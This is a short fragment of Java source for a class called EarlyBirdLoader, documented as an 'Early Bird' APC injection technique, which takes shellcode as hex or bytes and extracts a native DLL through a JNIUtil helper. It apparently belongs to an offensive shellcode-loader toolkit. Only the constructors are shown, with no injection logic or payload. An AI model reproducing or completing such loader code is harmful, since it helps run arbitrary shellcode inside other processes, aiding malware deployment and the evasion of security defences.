...
/**
 * A way of APC Injection called Early Bird
 */
@SuppressWarnings("unused")
public class EarlyBirdLoader extends JavaGate {
    public EarlyBirdLoader(String shellCodeHex) {
        super(shellCodeHex);
        JNIUtil.extractDll(JAVA_LOADER);
    }

    public EarlyBirdLoader(byte[] shellCode) {
        super(shellCode);
        JNIUtil.extractDll(JAVA_LOADER);
    }
